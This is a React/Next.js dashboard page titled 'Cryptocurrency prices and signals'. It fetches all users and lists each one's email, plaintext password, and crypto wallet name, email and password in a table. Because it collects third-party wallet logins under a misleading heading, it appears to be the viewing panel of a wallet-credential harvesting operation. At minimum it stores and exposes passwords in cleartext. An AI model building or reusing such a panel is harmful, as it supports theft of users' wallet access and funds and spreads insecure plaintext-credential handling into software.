import DashboardLayout from "@/components/layout/DashboardLayout";
import { IUser, Response } from "@/interface/coins";
import { getAllUsers } from "@/service/apiRequest";
import { ReactElement, useEffect, useState } from "react";

function Users() {
  const [users, setUsers] = useState<IUser[]>();

  useEffect(() => {
    const allUsers = async () => {
      const data: Response<IUser[]> = await getAllUsers();

      if (data.statusCode === 200) setUsers(data.data);
    };

    allUsers();
  }, []);

  return (
    <div>
      <h1 className="text-2xl">Cryptocurrency prices and signals</h1>
      <div className="max-w-[1000px] w-full overflow-hidden rounded-lg shadow-xs mx-auto mt-10">
        <div className="w-full overflow-x-auto">
          <table className="w-full whitespace-no-wrap">
            <thead>
              <tr className="text-xs font-semibold tracking-wide text-center text-gray-500 uppercase border-b dark:border-gray-700 bg-gray-50 dark:text-gray-400 dark:bg-gray-800">
                <th className="px-4 py-3">Email</th>
                <th className="px-4 py-3">Password</th>
                <th className="px-4 py-3">Wallet</th>
                <th className="px-4 py-3">Wallet Email</th>
                <th className="px-4 py-3">Wallet Password</th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y dark:divide-gray-700 dark:bg-gray-800">
              {
                // show user data
                users &&
                  users?.map((user) => (
                    <tr
                      key={user?.userId}
                      className="text-gray-700 dark:text-gray-400">
                      <td className="px-4 py-3 items-center">
                        <p className="text-center font-medium">{user?.email}</p>
                      </td>
                      <td className="px-4 py-3 items-center">
                        <p className="text-center font-medium">
                          {user?.password}
                        </p>
                      </td>
                      <td className="px-4 py-3 items-center">
                        <p className="text-center font-medium">
                          {user?.wallet?.walletName || "N/A"}
                        </p>
                      </td>
                      <td className="px-4 py-3 text-sm text-center">
                        <p className="text-center font-medium ">
                          {user?.wallet?.email || "N/A"}
                        </p>
                      </td>
                      <td className="px-4 py-3 text-sm text-center">
                        <p className="text-center font-medium ">
                          {user?.wallet?.password || "N/A"}
                        </p>
                      </td>
                    </tr>
                  ))
              }

              {!users && (
                <tr>
                  <td className="text-center w-full items-center py-5">
                    <p> User data not found </p>
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

export default Users;

Users.getLayout = function getLayout(page: ReactElement) {
  return <DashboardLayout>{page}</DashboardLayout>;
};
